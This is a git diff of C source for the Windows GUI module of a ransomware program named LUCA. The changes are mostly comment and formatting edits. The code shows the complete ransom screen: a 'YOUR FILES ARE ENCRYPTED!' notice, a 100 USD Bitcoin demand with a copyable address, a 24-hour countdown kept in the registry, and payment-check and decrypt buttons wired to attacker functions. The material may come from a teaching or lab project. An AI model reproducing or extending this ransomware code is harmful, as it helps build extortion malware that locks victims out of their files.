@@ -1,13 +1,12 @@
+/*  This file contins the code for the Message Module of LUCA. Is defines a simple GUI with Windows API functions. */
+#include <stdio.h>
+#include <windows.h>
+#include <commctrl.h>
+#include <time.h>
+
 #include "attack_web.h"
 #include "attack_decrypt.h"
 #include "store_in_register.h"
-
-#include <windows.h>
-#include <commctrl.h>
-#include <stdio.h>
-#include <time.h>
-
-#pragma comment(lib, "comctl32.lib")
 
 #define SECONDS_24H (24 * 60 * 60)
 #define TIMER_ID 1
@@ -18,6 +17,7 @@ time_t gExpiryTime = 0;
 
 const char g_szClassName[] = "RansomwareWindow";
 
+// Ransom message
 const char message[] =  "Oh-oh! Many of your files have been encrypted. You will lose them permanently unless you follow the instrcutions.\r\n" 
                         "To get your files back you need to pay 100 USD to the BitCoin address below. Check the payment status with the button. "
                         "If it went through fit <Decrypt> to get your documents back. There may be a 1-hour delay between your payment and the successful decryption.\r\n" 
@@ -34,31 +34,29 @@ HWND hCopyBtn;
 
 
 // Ensure the expiry time exists; create it if missing
-int EnsureExpiryTimeExists(void)
-{
+int EnsureExpiryTimeExists(void) {
     storage_context_t ctx = { EXPIRY_REG_PATH };
     ULONGLONG expiry = 0;
 
     // Try to read existing expiry
     if (load_qword(&ctx, EXPIRY_VALUE_NAME, &expiry) == 0) {
-        // Exists → nothing to do
+        // If exists nothing to do
         return 1;
     }
 
-    // Value missing → create it (24h from now)
+    // If value missing create it (24h from now)
     time_t now = time(NULL);
     expiry = (ULONGLONG)(now + SECONDS_24H);
 
     if (store_qword(&ctx, EXPIRY_VALUE_NAME, expiry) != 0) {
-        return 0; // failed to write
+        return 0;
     }
 
     return 1;
 }
 
-// Read the expiry time from registry
-time_t ReadExpiryTime(void)
-{
+/* Read the expiry time from registry */ 
+time_t ReadExpiryTime(void) {
     storage_context_t ctx = { EXPIRY_REG_PATH };
     ULONGLONG expiry = 0;
 
@@ -69,8 +67,8 @@ time_t ReadExpiryTime(void)
     return (time_t)expiry;
 }
 
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
-{
+/* LUCA GUI */
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     static HWND hLabelTitle;
     static HWND hLabelText;
     static HWND hBtnOk;
@@ -81,6 +79,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     {
     case WM_CREATE:
     {
+        // Handle timer
         gExpiryTime = ReadExpiryTime();
 
         if (gExpiryTime == 0)
@@ -116,7 +115,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             hwnd, NULL, NULL, NULL
         );
 
-        // Title at top
+        // Title
         hLabelTitle = CreateWindow(
             "STATIC",
             "YOUR FILES ARE ENCRYPTED!",
@@ -126,7 +125,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         );
         SendMessage(hLabelTitle, WM_SETFONT, (WPARAM)hTitleFont, TRUE);
 
-        // Scrollable text field below title
+        // Scrollable text field 
         hLabelText = CreateWindow(
             "EDIT",
             message,
@@ -136,7 +135,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         );
         SendMessage(hLabelText, WM_SETFONT, (WPARAM)hTextFont, TRUE);
 
-        // Smaller copyable text field below big text field
+        // BitCOin address field
         hCopyEdit = CreateWindow(
             "EDIT",
             "1F9xQeR7KpM3D8Z2A6WcYHnL4BvTtS5uJ",
@@ -146,7 +145,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         );
         SendMessage(hCopyEdit, WM_SETFONT, (WPARAM)hTextFont, TRUE);
 
-        // Copy button next to the small text field
+        // Copy button
         hCopyBtn = CreateWindow(
             "BUTTON",
             "Copy Bitcoin address",
@@ -156,7 +155,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         );
         SendMessage(hCopyBtn, WM_SETFONT, (WPARAM)hTextFont, TRUE);
 
-        // Timer label below small text + button, bigger font
+        // Timer
         hTimerLabel = CreateWindow(
             "STATIC",
             "Loading timer",
@@ -171,7 +170,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             VARIABLE_PITCH, "Segoe UI");
         SendMessage(hTimerLabel, WM_SETFONT, (WPARAM)hTimerFont, TRUE);
 
-        // Check payment button bottom-right
+        // Check payment button 
         hBtnOk = CreateWindow(
             "BUTTON",
             "Check payment",
@@ -181,7 +180,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
         );
         SendMessage(hBtnOk, WM_SETFONT, (WPARAM)hTextFont, TRUE);
 
-        // New Test button to the left of Check payment
+        // Decrypt button
         HWND hBtnTest = CreateWindow(
             "BUTTON",
             "Decrypt",
@@ -211,6 +210,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     case WM_COMMAND:
         switch (LOWORD(wParam))
         {
+        // Handle Check payment status
         case 1:
             if (get_decryption_key_from_attacker() != 0) {
                 MessageBox(hwnd, "Please complete the payment to obtain the key. \r\n Note: the payment is registered after abount 1 hour.", "Info", MB_OK | MB_ICONINFORMATION);
@@ -219,7 +219,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
             }
             SendMessage(hStatusBar, SB_SETTEXT, 0, (LPARAM)"Check clicked");
             break;
-
+        // Handle copy BitCoint address
         case 2:
             char buf[256];
             GetWindowTextA(hCopyEdit, buf, sizeof(buf));
@@ -233,6 +233,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 SetClipboardData(CF_TEXT, hMem);
                 CloseClipboard();
             }
+        // Handle decrypt
         case 3:
             if (attack_decrypt() != 0) {
                 MessageBox(hwnd, "Please complete the payment to obtain the key. \r\n Note: the payment is registered after abount 1 hour.", "Info", MB_OK | MB_ICONINFORMATION);
@@ -244,6 +245,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
         }
     break;
+    // Timer format
     case WM_TIMER:
     {
         if (wParam == TIMER_ID)
@@ -288,8 +290,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     return 0;
 }
 
-int CreateBadWindow(HINSTANCE hInstance, int nCmdShow)
-{
+/* Public API for creating ransomware window */
+int CreateBadWindow(HINSTANCE hInstance, int nCmdShow) {
     WNDCLASSEX wc = { 0 };
     HWND hwnd;
     MSG Msg;
@@ -313,7 +315,7 @@ int CreateBadWindow(HINSTANCE hInstance, int nCmdShow)
     hwnd = CreateWindowEx(
         WS_EX_TOPMOST,
         g_szClassName,
-        "Nasty computer virus",
+        "LUCA",
         WS_OVERLAPPEDWINDOW | WS_VISIBLE,
         CW_USEDEFAULT, CW_USEDEFAULT,
         width, height,
